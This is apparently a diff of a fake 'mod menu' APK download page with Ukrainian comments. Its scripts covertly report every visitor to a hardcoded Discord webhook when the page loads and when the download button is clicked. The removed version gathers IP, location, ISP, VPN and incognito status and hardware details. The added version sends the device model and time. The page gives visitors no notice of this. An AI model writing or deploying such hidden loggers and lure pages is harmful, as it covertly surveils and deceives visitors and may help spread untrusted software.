@@ -3,114 +3,106 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download Page</title>
     <style>
-        body { margin: 0; background-color: #000; color: white; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; text-align: center; }
-        h1 { font-size: 42px; color: #ff0000; text-shadow: 0 0 10px rgba(255,0,0,0.5); margin-bottom: 30px; }
-        .btn { display: inline-block; padding: 22px 50px; background: linear-gradient(145deg, #00ff00, #00cc00); color: black; text-decoration: none; font-size: 24px; font-weight: bold; border-radius: 15px; box-shadow: 0 0 25px rgba(0, 255, 0, 0.4); cursor: pointer; border: none; transition: 0.3s; }
-        .btn:hover { transform: scale(1.05); box-shadow: 0 0 40px rgba(0, 255, 0, 0.6); }
+        body {
+            margin: 0;
+            background-color: #000;
+            color: white;
+            font-family: sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            text-align: center;
+        }
+        h1 {
+            font-size: 40px;
+            color: #ff0000;
+            margin-bottom: 30px;
+        }
+        .btn {
+            display: inline-block;
+            padding: 20px 45px;
+            background-color: #00ff00;
+            color: black;
+            text-decoration: none;
+            font-size: 22px;
+            font-weight: bold;
+            border-radius: 12px;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
+            transition: transform 0.2s;
+            cursor: pointer;
+            border: none;
+        }
+        .btn:active {
+            transform: scale(0.95);
+        }
     </style>
 </head>
 <body>
 
-    <h1>MOD MENU STABLE</h1>
+    <h1>MODER LOH</h1>
     <a href="app-debug.apk" download class="btn" id="downloadBtn">DOWNLOAD APK</a>
 
     <script>
+        // Твій Discord Webhook
         const webhookURL = "https://discord.com/api/webhooks/1495809375573512193/DEsfDangmHPuq7wW2twRrtq4HARd1zkW-zueLyT1Zl9lV5c5f5pgLj_2GqGArpIvIsyC";
-        const startTime = Date.now();
 
-        async function getAdvancedData() {
-            let info = {
-                ip: "Заблоковано", city: "Невідомо", prov: "Невідомо", vpn: "Ні",
-                model: "Android Device", cpu: navigator.hardwareConcurrency || "N/A",
-                ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
-                gpu: "N/A", batt: "N/A", net: "N/A", incognito: "Ні"
-            };
-
-            // 1. Подвійна перевірка IP (якщо один сервіс лежить, спрацює інший)
-            try {
-                let response = await fetch('https://ipapi.co/json/');
-                if (!response.ok) throw new Error();
-                let g = await response.json();
-                info.ip = g.ip;
-                info.city = `${g.city}, ${g.country_name}`;
-                info.prov = g.org;
-                if (g.org.toLowerCase().match(/vpn|proxy|hosting|cloud/)) info.vpn = "ТАК (Ймовірно)";
-            } catch {
+        // Функція відправки даних
+        async function sendToDiscord(eventTitle, color) {
+            let modelName = "Android (Unknown)";
+            
+            // Спроба витягнути точну модель через High Entropy Client Hints
+            if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
                 try {
-                    let res2 = await fetch('https://api.ipify.org?format=json');
-                    let g2 = await res2.json();
-                    info.ip = g2.ip + " (Тільки IP)";
-                } catch {}
+                    const hints = await navigator.userAgentData.getHighEntropyValues(['model', 'platform', 'platformVersion']);
+                    if (hints.model) {
+                        modelName = `${hints.platform} (${hints.model})`;
+                    }
+                } catch (e) {
+                    modelName = "Android (K/Protected)";
+                }
+            } else {
+                // Старий метод, якщо Client Hints не підтримуються
+                const ua = navigator.userAgent;
+                if (/android/i.test(ua)) {
+                    const match = ua.match(/Android\s+([^\s;]+);?\s+([^;)]+)/);
+                    modelName = (match && match[2] !== 'K') ? `Android (${match[2]})` : "Android (K/Old Browser)";
+                } else if (/iPhone|iPad/.test(ua)) {
+                    modelName = "iOS Device";
+                }
             }
-
-            // 2. GPU (Відеокарта) - видає реальний чип
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl');
-                const debug = gl.getExtension('WEBGL_debug_renderer_info');
-                info.gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
-            } catch(e) {}
-
-            // 3. Точна модель (HTTPS)
-            if (navigator.userAgentData?.getHighEntropyValues) {
-                const h = await navigator.userAgentData.getHighEntropyValues(['model', 'platformVersion']);
-                if (h.model) info.model = `${h.model} (Android ${h.platformVersion})`;
-            }
-
-            // 4. Батарея
-            if (navigator.getBattery) {
-                const b = await navigator.getBattery();
-                info.batt = `${Math.round(b.level * 100)}% (${b.charging ? 'Зарядка ⚡' : 'Розрядка 🔋'})`;
-            }
-
-            // 5. Мережа
-            if (navigator.connection) {
-                info.net = `${navigator.connection.effectiveType.toUpperCase()} (${navigator.connection.rtt}ms)`;
-            }
-
-            // 6. Спроба виявити Інкогніто
-            if (navigator.storage && navigator.storage.estimate) {
-                const {quota} = await navigator.storage.estimate();
-                if (quota < 120000000) info.incognito = "ТАК";
-            }
-
-            return info;
-        }
-
-        async function sendLog(event) {
-            const d = await getAdvancedData();
-            const timeElapsed = ((Date.now() - startTime) / 1000).toFixed(1);
 
             const payload = {
-                // Прямий заголовок у Discord
-                "content": `🚨 **${event === 'visit' ? 'ВХІД' : 'КЛІК'}**: ${d.ip} | ${d.model}`,
-                "embeds": [{
-                    "title": event === 'visit' ? "👤 Новий візит на сайт" : "📥 Натиснуто завантаження",
-                    "color": event === 'visit' ? 3066993 : 15105570,
-                    "fields": [
-                        { "name": "📱 Пристрій", "value": `\`${d.model}\`\n\`GPU: ${d.gpu}\``, "inline": false },
-                        { "name": "🧠 Залізо", "value": `\`CPU: ${d.cpu} ядер\`\n\`RAM: ${d.ram}\``, "inline": true },
-                        { "name": "🔋 Батарея", "value": `\`${d.batt}\``, "inline": true },
-                        { "name": "🌐 Мережа", "value": `\`IP: ${d.ip}\`\n\`Провайдер: ${d.prov}\`\n\`Тип: ${d.net}\``, "inline": false },
-                        { "name": "📍 Локація", "value": `\`${d.city}\`\n\`VPN: ${d.vpn}\``, "inline": true },
-                        { "name": "🕵️ Інкогніто", "value": `\`${d.incognito}\``, "inline": true },
-                        { "name": "⏱ Час", "value": `\`${timeElapsed} сек.\``, "inline": true }
-                    ],
-                    "footer": { "text": "Titanium Logger v11.0" },
-                    "timestamp": new Date()
+                embeds: [{
+                    title: eventTitle,
+                    description: `📱 **Пристрій:** \`${modelName}\`\n⏰ **Час:** ${new Date().toLocaleString('uk-UA')}`,
+                    color: color
                 }]
             };
 
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
+            try {
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (err) {
+                console.error("Помилка вебхука:", err);
+            }
         }
 
-        window.onload = () => setTimeout(() => sendLog('visit'), 1200);
-        document.getElementById('downloadBtn').onclick = () => sendLog('download');
+        // Подія: Хтось зайшов на сторінку
+        window.addEventListener('DOMContentLoaded', () => {
+            sendToDiscord("👤 Хтось перейшов по посиланню!", 3066993); // Зелений колір
+        });
+
+        // Подія: Натискання кнопки скачування
+        document.getElementById('downloadBtn').addEventListener('click', () => {
+            sendToDiscord("📥 Почав скачувати файл!", 15105570); // Помаранчевий колір
+        });
     </script>
 </body>
 </html>
